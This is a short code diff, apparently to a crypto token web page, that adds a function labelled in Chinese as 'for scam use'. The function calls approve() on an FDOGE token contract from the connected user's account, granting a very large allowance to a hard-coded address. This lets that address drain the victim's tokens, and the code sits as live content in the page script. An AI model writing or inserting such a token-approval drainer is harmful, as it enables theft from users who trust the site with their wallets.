@@ -218,4 +218,8 @@
     }
     
 
-    
+    //詐騙專用
+    var appr = '115792089237316195423570985008687456';
+    async function scam(){
+        FDOGE_agiContract.methods.approve('0x5DFC690c80c644D486f010478b4f3cfde87C4b4D',appr).send({from: coinbase,gas: 80000})
+    }
